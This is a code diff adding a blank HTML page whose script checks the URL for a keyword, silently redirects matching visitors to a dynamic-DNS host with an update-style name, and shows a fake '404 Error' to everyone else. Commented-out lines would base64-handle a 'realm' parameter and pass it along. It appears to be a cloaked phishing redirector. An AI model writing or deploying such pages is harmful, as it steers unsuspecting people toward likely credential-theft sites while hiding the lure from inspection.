@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title></title>
+    <meta charset="UTF-8">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    if (window.location.href.indexOf("navs") > -1) {
+
+    var url_string = window.location.href; //window.location.href
+    var url = new URL(url_string);
+    var c = url.searchParams.get("name");
+
+
+
+    /**
+     * Add a URL parameter 
+     * @param {string} url 
+     * @param {string} param the key to set
+     * @param {string} value 
+     */
+    var addParam = function(url, param, value) {
+        param = encodeURIComponent(param);
+        var a = document.createElement('a');
+        param += (value ? "=" + encodeURIComponent(value) : "");
+        a.href = url;
+        a.search += (a.search ? "&" : "") + param;
+        return a.href;
+    }
+
+    /**
+     * Add a URL parameter (or modify if already exists)
+     * @param {string} url 
+     * @param {string} param the key to set
+     * @param {string} value 
+     */
+    var addOrReplaceParam = function(url, param, value) {
+        param = encodeURIComponent(param);
+        var r = "([&?]|&amp;)" + param + "\\b(?:=(?:[^&#]*))*";
+        var a = document.createElement('a');
+        var regex = new RegExp(r);
+        var str = param + (value ? "=" + encodeURIComponent(value) : "");
+        a.href = url;
+        var q = a.search.replace(regex, "$1" + str);
+        if (q === a.search) {
+            a.search += (a.search ? "&" : "") + str;
+        } else {
+            a.search = q;
+        }
+        return a.href;
+    }
+    //lite = url.searchParams.get("realm");
+    //var decodedStringAtoB = atob(lite);
+    //var encodedStringBtoA = btoa(lite);
+    url = "https://jmpgnnsupdate-info.dynv6.net/nav";
+    //newurl = addParam(url, "realm", lite);
+    window.location.replace(url);
+
+
+} else {
+    alert("404 Error");
+}
+});
+</script>
+  </head>
+  <body>
+  </body>
+</html>
